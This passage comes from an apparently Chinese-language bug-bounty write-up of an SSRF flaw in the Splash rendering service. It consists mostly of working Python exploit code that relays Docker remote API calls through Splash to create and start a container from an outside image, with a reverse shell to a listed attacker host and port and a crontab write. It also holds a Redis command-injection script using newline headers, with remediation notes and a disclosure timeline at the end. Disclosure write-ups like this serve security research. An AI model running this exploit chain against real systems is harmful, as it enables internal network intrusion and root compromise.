            ],
        }
        url = "%s/render.html" % api
        docker_url = '%s/containers/create' % docker_api
        params = {
            'http_method': 'POST',
            'url': docker_url,
            'timeout': 60
        }
        resp = requests.post(url, params=params, json={
            'headers': {'Content-Type': 'application/json'},
            "body": json.dumps(body)
        })
        print(resp.request.url)
        print(resp.status_code)
        print(resp.text)
        result = re.search('"Id":"(\w+)"', resp.text)
        container_id = result.group(1)
        print(container_id)
        print("-" * 50)
        return container_id
    def start_container(api, docker_api, container_id):
        url = "%s/render.html" % api
        docker_url = '%s/containers/%s/start' % (docker_api, container_id)
        params = {
            'http_method': 'POST',
            'url': docker_url,
            'timeout': 10
        }
        resp = requests.post(url, params=params, json={
            'headers': {'Content-Type': 'application/json'},
            "body": "",
        })
        print(resp.request.url)
        print(resp.status_code)
        print(resp.text)
        print("-" * 50)
    def get_result(api, docker_api, container_id):
        url = "%s/render.html" % api
        docker_url = '%s/containers/%s/json' % (docker_api, container_id)
        params = {
            'url': docker_url
        }
        resp = requests.get(url, params=params, json={
            'headers': {
                'Accept': 'application/json'},
        })
        print(resp.request.url)
        print(resp.status_code)
        result = re.search('"ExitCode":(\w+),"', resp.text)
        exit_code = result.group(1)
        if exit_code == '0':
            print('success')
        else:
            print('error')
        print("-" * 50)
    if __name__ == '__main__':
        # splash地址和端口
        splash_host = '192.168.1.120'
        splash_port = 8050
        # 内网docker的地址和端口
        docker_host = '172.16.10.74'
        docker_port = 2375
        # 反弹shell的地址和端口
        shell_host = '192.168.1.213'
        shell_port = 12345
        splash_api = "http://%s:%d" % (splash_host, splash_port)
        docker_api = 'http://%s:%d' % (docker_host, docker_port)
        # docker image，存在docker hub上
        image_name = 'b1ngz/busybox'
        image_tag = 'latest'
        # 拉取 image
        pull_image(splash_api, docker_api, image_name, image_tag)
        # 创建 container
        container_id = create_container(splash_api, docker_api, image_name, image_tag, shell_host, shell_port)
        # 启动 container
        start_container(splash_api, docker_api, container_id)
        # 获取写入crontab结果
        get_result(splash_api, docker_api, container_id)
## 其他利用思路
其他思路的话，首先想到 ssrf 配合 `gopher` 协议，然后结合内网 redis，因为splash是基于qt的，
查了一下[文档](https://wiki.python.org/moin/PyQt/Adding%20the%20Gopher%20Protocol%20to%20QtWebKit)
，qtwebkit 默认不支持 `gopher` 协议，所以无法使用 `gopher` 。
后来经过测试，发现请求 `headers` 可控 ，并且支持 `\n` 换行
这里测试选择了 redis 3.2.8 版本，以root权限运行，监听在 172.16.10.74，测试脚本如下，可以成功执行
    # -*- coding: utf-8 -*-    __author__ = 'b1ng'
    import requests
    def test_get(api, redis_api):
        url = "%s/render.html" % api
        params = {
            'url': redis_api,
            'timeout': 10
        }
        resp = requests.post(url, params=params, json={
            'headers': {
                'config set dir /root\n': '',
            },
        })
        print(resp.request.url)
        print(resp.status_code)
        print(resp.text)
    if __name__ == '__main__':
        # splash地址和端口
        splash_host = '192.168.1.120'
        splash_port = 8050
        # 内网docker的地址和端口
        docker_host = '172.16.10.74'
        docker_port = 6379
        splash_api = "http://%s:%d" % (splash_host, splash_port)
        docker_api = 'http://%s:%d' % (docker_host, docker_port)
        test_get(splash_api, docker_api)
运行后 redis 发出了警告 (高版本的新功能)
    24089:M 11 Jul 23:29:07.730 - Accepted 172.17.0.2:56886
    24089:M 11 Jul 23:29:07.730 # Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.
但是执行了
    172.16.10.74:6379> config get dir
    1) "dir"
    2) "/root"
后来又测试了一下 post body，发现 body 还没发出去，连接就被强制断开了，所以无法利用
这里用 nc 来看一下发送的数据包
    root@test:/home/user/Desktop# nc -vv -l -p 5555
    Listening on [0.0.0.0] (family 0, port 5555)
    Connection from [172.17.0.2] port 5555 [tcp/*] accepted (family 2, sport 38384)
    GET / HTTP/1.1
    config set dir /root
    :
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) splash Safari/538.1
    Connection: Keep-Alive
    Accept-Encoding: gzip, deflate
    Accept-Language: en,*
    Host: 172.16.10.74:5555
可以看到 `config set dir /root`，说明可以利用
其他的话，因为支持post，也可以结合一些内网系统进行利用，这里就不细说了
# 0x 04 修复方案
对于splash，看了下文档，没有提到认证说明，应该是应用本身就没有这个功能，所以得自己加认证，临时方案可以用 basic
认证，彻底修复的话还是得自己修改代码，加上认证功能
这里的 docker remote api，应该是因为旧版本的 swarm 开放的，根据
[文档](https://docs.docker.com/v1.11/swarm/install-manual/) 中 step 3，每个 node
都会开放 2375 或者 2376 端口，通过 iptables 来限制的话，需要配置 client node 的端口只允许 manager
访问，manager 的端口需要加白名单
# 0x 05 Timeline
2017-07-05 02:00:00 提交漏洞，报告内容为存在带回显 SSRF
2017-07-05 10:07:28 深入后成功获取内网服务器root权限 (可获取多台服务器root权限，并可拉取和push
docker仓库image，仓库中有如 api-xxx、xxx.com 名称的 image )，联系审核人员，提交补充后的报告
2017-07-06 18:15:00
联系审核人员，询问进度，告知已复现。因为之前相同危害漏洞评级为严重，所以询问此漏洞是否属于严重漏洞，告知金币兑换比例提升后( 5:1 提升为 1:1
)，严重漏洞评定收紧，明天审核
2017-07-07 14:31:00
审核人员告知复现时，获取内网权限步骤遇到问题，要求提供更多细节，因为之前笔记笔记乱，回复晚些整理后再发送，顺带询问评级，答复获取到权限的服务器不属于核心服务器，并且内部对评为
一般业务高危 还是 一般业务严重 存在分歧，对应金币奖励为 800 和 1000，正好赶上三倍活动，也就是 2400 -3000。这里算了一下，按照奖励提升之前的评级规则，相同危害的漏洞是评为核心严重的，对应奖励为 5000现金 + 3000 积分
(兑换比例5:1)，这里相同危害，奖励提升后，再加上三倍金币活动，比之前的奖励还低一些，所以觉得不合理，因赶上周五和其他一些事情，商量下周一给评级
2017-07-10 10:16:00 联系审核人员，因为两边对于评级意见不一致，询问是否能够给予授权，继续深入，尝试证明可获取到 “核心服务器”
权限，回复没有给予授权，并告知可以判定为非核心严重级别，询问是否能够接受，回复不能接受，并给出理由
2017-07-12 10:08:00 联系审核人员，提供获取反弹shell EXP，并告知会写文章，希望尽快确认并修复，最终给予评级 严重非核心
，1500 积分，4500 金币(三倍活动)